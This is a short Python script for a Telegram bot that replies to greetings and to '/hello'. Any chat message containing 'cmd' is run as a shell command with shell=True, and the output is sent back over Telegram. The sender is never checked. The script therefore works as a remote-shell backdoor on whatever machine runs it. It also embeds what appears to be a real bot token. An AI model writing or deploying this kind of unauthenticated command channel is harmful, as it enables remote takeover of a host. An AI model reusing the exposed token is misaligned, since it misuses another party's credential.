import telepot
import os
import pprint
from telepot.loop import MessageLoop
import subprocess

TOKEN = '5471857507:AAFbdaI3S7UDuC2t6Abct_XjaZa_icjQBCQ'

greeting_close = ['bye','nice talking to you','have a good day' , 'we will meet soon','get lost','bye bye']

def handle(msg):
	import random
	chat_id = msg['chat']['id']
	command = msg['text']
	x = command.replace('/','')

	if x in greeting_close:
		bot.sendMessage(chat_id, random.choice(greeting_close))

	if command == '/hello':
		bot.sendMessage(chat_id,'hieeee')

	if 'cmd' in x:
		cmd_command = x.replace('cmd ','')
		x = subprocess.Popen(cmd_command,shell=True, stdout=subprocess.PIPE).stdout
		x = x.read()
		bot.sendMessage(chat_id,x)

bot = telepot.Bot(TOKEN)
MessageLoop(bot,handle).run_forever()